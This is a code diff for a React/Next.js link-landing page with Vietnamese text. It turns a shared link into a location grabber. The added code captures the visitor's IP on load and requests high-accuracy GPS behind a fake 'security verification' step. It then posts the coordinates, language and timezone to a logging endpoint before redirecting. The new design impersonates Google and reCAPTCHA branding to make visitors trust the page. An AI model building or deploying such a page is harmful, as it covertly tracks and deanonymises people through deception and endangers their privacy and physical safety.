@@ -1,9 +1,10 @@
+
 'use client';
 
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
-import { Loader2, FileText, UserCheck } from 'lucide-react';
+import { Loader2, FileText, UserCheck, ShieldCheck } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import type { Link as LinkType } from '@/app/actions/links';
 
@@ -12,124 +13,97 @@ interface LinkVerificationClientProps {
 }
 
 export function LinkVerificationClient({ link }: LinkVerificationClientProps) {
-  const [status, setStatus] = useState('Đang chờ xác minh của bạn...');
+  const [status, setStatus] = useState('Đang kiểm tra độ bảo mật...');
   const [isVerifying, setIsVerifying] = useState(false);
+  const [clientIp, setClientIp] = useState('N/A');
+
+  // Capture IP immediately on load
+  useEffect(() => {
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => setClientIp(data.ip))
+      .catch(() => setClientIp('N/A'));
+  }, []);
 
   const handleVerification = async () => {
     setIsVerifying(true);
     
-    let clientIp = 'N/A';
-    try {
-      setStatus('Đang xác định địa chỉ mạng...');
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      if (ipResponse.ok) {
-        clientIp = (await ipResponse.json()).ip;
-      }
-    } catch (e) {
-      setStatus('Không thể xác định địa chỉ mạng. Đang tiếp tục...');
-    }
-
     const logAndRedirect = (pos?: GeolocationPosition) => {
-      setStatus('Đang ghi lại thông tin an toàn và chuẩn bị chuyển hướng...');
+      setStatus('Ghi nhận thông tin an toàn...');
       
-      const body: { ip: string; lat?: number; lon?: number; acc?: number; linkId: string; lang: string, timezone: string } = { 
+      const body = { 
           ip: clientIp,
           linkId: link.id,
           lang: navigator.language || 'N/A',
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+          lat: pos?.coords.latitude,
+          lon: pos?.coords.longitude,
+          acc: pos?.coords.accuracy
       };
 
-      if (pos) {
-        body.lat = pos.coords.latitude;
-        body.lon = pos.coords.longitude;
-        body.acc = pos.coords.accuracy;
-      }
-
-      const payload = JSON.stringify(body);
-      
       fetch('/api/log-location', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: payload,
+        body: JSON.stringify(body),
         keepalive: true,
-      }).catch(err => {
-          console.error("Logging failed, but redirecting anyway:", err);
       }).finally(() => {
           setTimeout(() => {
               window.location.href = link.redirectUrl;
-          }, 150);
+          }, 500);
       });
     };
 
-    setStatus('Đang yêu cầu quyền truy cập vị trí...');
+    setStatus('Đang xác minh GPS...');
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         logAndRedirect,
         () => {
-          setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
+          setStatus('Vị trí bị từ chối. Đang tiếp tục...');
           logAndRedirect();
         },
         { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
       );
     } else {
-      setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
       logAndRedirect();
     }
   };
 
   return (
-    <div className="flex justify-center items-center min-h-screen bg-cover bg-center p-4" style={{backgroundImage: `url(${link.imageUrl})`}}>
-      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
-      <Card className="z-10 p-6 sm:p-8 rounded-xl shadow-2xl text-center max-w-lg w-full bg-card/80 backdrop-blur-lg border border-white/20">
-        <CardContent className="p-0 flex flex-col items-center">
+    <div className="flex justify-center items-center min-h-screen bg-white p-4 font-bold italic">
+      <div className="text-center w-full max-w-sm">
+        <Image 
+            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
+            alt="Google" 
+            width={92} 
+            height={30} 
+            className="h-6 mx-auto mb-10 opacity-70"
+        />
+        
+        {isVerifying ? (
+            <>
+                <div className="w-10 h-10 border-4 border-gray-100 border-t-blue-500 rounded-full animate-spin mx-auto mb-6" />
+                <p className="text-gray-400 uppercase text-[9px] animate-pulse tracking-widest">{status}</p>
+            </>
+        ) : (
+            <div className="animate-in fade-in slide-in-from-bottom-4 duration-700">
+                <div className="bg-gray-50 p-4 rounded-3xl border border-gray-100 mb-8 overflow-hidden shadow-sm">
+                    <div className="flex items-center gap-3 mb-4 text-left px-2">
+                        <FileText className="h-5 w-5 text-blue-500 opacity-60" />
+                        <span className="text-[10px] text-gray-400 uppercase truncate">{link.title}</span>
+                    </div>
+                    <div className="aspect-video w-full rounded-2xl overflow-hidden mb-2">
+                        <Image src={link.imageUrl} alt="Preview" width={400} height={225} className="object-cover w-full h-full grayscale opacity-50" />
+                    </div>
+                </div>
 
-          <div className="w-full bg-muted/30 rounded-lg p-4 mb-6 border border-white/10">
-            <div className="flex items-center gap-4 mb-4 text-left">
-                 <div className="bg-primary/10 p-3 rounded-lg border border-primary/20">
-                    <FileText className="h-6 w-6 text-primary" />
-                 </div>
-                 <div>
-                    <p className="font-bold text-lg text-foreground leading-tight">{link.title}</p>
-                    <p className="text-sm text-muted-foreground">{link.description}</p>
-                 </div>
+                <Button onClick={handleVerification} className="p-8 bg-white border border-gray-100 rounded-[30px] w-full shadow-lg text-[11px] uppercase flex justify-between items-center text-gray-700 hover:bg-gray-50 transition-all border-b-4 active:border-b-0 active:translate-y-1">
+                    <span>TIẾP TỤC TRUY CẬP</span>
+                    <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width={20} height={20} className="opacity-40" />
+                </Button>
+                <p className="text-gray-300 text-[8px] mt-6 uppercase tracking-tighter">Bảo mật hệ thống bởi Sentinel Master v78</p>
             </div>
-            <div className="aspect-[16/10] w-full rounded-md bg-background flex items-center justify-center overflow-hidden shadow-inner">
-                <Image
-                    src={link.imageUrl}
-                    alt={link.title}
-                    width={800}
-                    height={500}
-                    className="object-cover w-full h-full"
-                    priority
-                />
-            </div>
-          </div>
-          
-          {isVerifying ? (
-            <>
-              <h1 className="text-2xl font-bold mb-2 text-foreground">Đang xác thực quyền truy cập...</h1>
-              <p className="text-muted-foreground text-sm leading-normal mb-8">
-                Để đảm bảo an toàn, chúng tôi cần xác minh yêu cầu của bạn trước khi chuyển hướng. Vui lòng đợi.
-              </p>
-              <div className="w-full flex flex-col items-center justify-center gap-4 h-24">
-                <Loader2 className="h-10 w-10 text-primary animate-spin" />
-                <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
-              </div>
-            </>
-          ) : (
-            <>
-              <h1 className="text-2xl font-bold mb-2 text-foreground">{link.title}</h1>
-              <p className="text-muted-foreground text-sm leading-normal mb-8">
-                {link.description}
-              </p>
-              <Button onClick={handleVerification} size="lg" className="w-full h-16 text-lg font-bold">
-                 <UserCheck className="mr-3 h-6 w-6" />
-                 Tiếp tục để xem
-              </Button>
-            </>
-          )}
-        </CardContent>
-      </Card>
+        )}
+      </div>
     </div>
   );
 }
